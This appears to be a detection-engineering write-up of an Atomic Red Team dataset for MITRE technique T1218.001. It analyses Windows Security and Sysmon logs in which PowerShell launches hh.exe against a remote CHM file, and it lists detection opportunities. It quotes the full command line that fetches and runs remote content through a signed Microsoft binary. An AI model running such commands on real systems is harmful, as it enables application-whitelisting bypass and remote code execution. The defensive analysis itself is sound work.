# T1218.001-2: Compiled HTML File — Compiled HTML Help Remote Payload

## Technique Context

T1218.001 (Compiled HTML File) is a defense evasion technique where attackers abuse the legitimate Windows HTML Help executable (hh.exe) to proxy execution of malicious code. This technique leverages the fact that hh.exe is a signed Microsoft binary that can execute various file types, including remote content, making it an attractive "living off the land" option for bypassing application whitelisting and gaining initial execution. The detection community focuses on monitoring hh.exe command lines, especially those referencing remote URLs or suspicious file paths, process relationships showing hh.exe spawned from unexpected parents, and network connections from hh.exe to external resources.

## What This Dataset Contains

This dataset captures a successful execution of T1218.001 where PowerShell executes `hh.exe` against a remote CHM file. The key evidence includes:

**Process Creation Chain**: Security event 4688 shows the full process tree: `powershell.exe` → `cmd.exe` with command line `"cmd.exe" /c hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm` → `hh.exe` with command line `hh.exe  https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm`.

**Sysmon Process Events**: Sysmon event ID 1 captures the same process creations with additional detail, including file hashes. The hh.exe process (PID 9008) shows the full command line referencing the remote Atomic Red Team CHM file.

**Process Access Events**: Multiple Sysmon event ID 10 events show PowerShell accessing the spawned processes (whoami.exe, cmd.exe, conhost.exe, hh.exe) with high privileges (0x1FFFFF, 0x1F3FFF), indicating process monitoring behavior.

**Process Exit Status**: Security event 4689 shows hh.exe and cmd.exe both exited with status 0xFFFFFFFF (-1), indicating execution failures, likely due to Windows Defender blocking the malicious content.

## What This Dataset Does Not Contain

The dataset shows execution attempts but not successful malicious payload execution. The exit codes (0xFFFFFFFF) suggest Windows Defender Real-Time Protection blocked the technique before the CHM file could execute its embedded payload. There are no network connection events (Sysmon event ID 3) showing hh.exe downloading the remote CHM file, and no DNS query events (Sysmon event ID 22) for the GitHub domain. The PowerShell channel contains only standard test framework boilerplate (Set-ExecutionPolicy, CIM module loading) with no evidence of the actual technique execution commands. Missing are any file creation events for the downloaded CHM file or execution artifacts from the intended payload.

## Assessment

This dataset provides excellent telemetry for detecting T1218.001 attempts, even when blocked by endpoint protection. The Security and Sysmon logs capture the complete process execution chain with full command lines, making this ideal for building detections around hh.exe usage patterns. The process access events provide additional behavioral indicators of the spawning process monitoring its children. While the technique was blocked before full execution, the attempt telemetry is comprehensive and representative of what defenders would see during both successful and unsuccessful T1218.001 attacks. The data would be even stronger with network telemetry showing the HTTP request to download the CHM file.

## Detection Opportunities Present in This Data

1. **Process creation monitoring for hh.exe with URL arguments** - Security 4688/Sysmon 1 events showing hh.exe spawned with HTTP/HTTPS URLs in command line parameters
2. **Unusual parent processes for hh.exe** - Detecting hh.exe spawned by cmd.exe, PowerShell, or other scripting engines rather than typical user applications
3. **Command line analysis for remote CHM references** - Monitoring for hh.exe command lines containing remote file paths or URLs pointing to CHM files
4. **Process chain analysis** - Correlating PowerShell → cmd.exe → hh.exe execution sequences, especially with URL arguments
5. **Exit code anomaly detection** - Monitoring for hh.exe processes that exit with error codes (0xFFFFFFFF) potentially indicating blocked malicious content
6. **Process access patterns** - Detecting parent processes that immediately access spawned hh.exe processes with high privileges, indicating potential monitoring or injection attempts
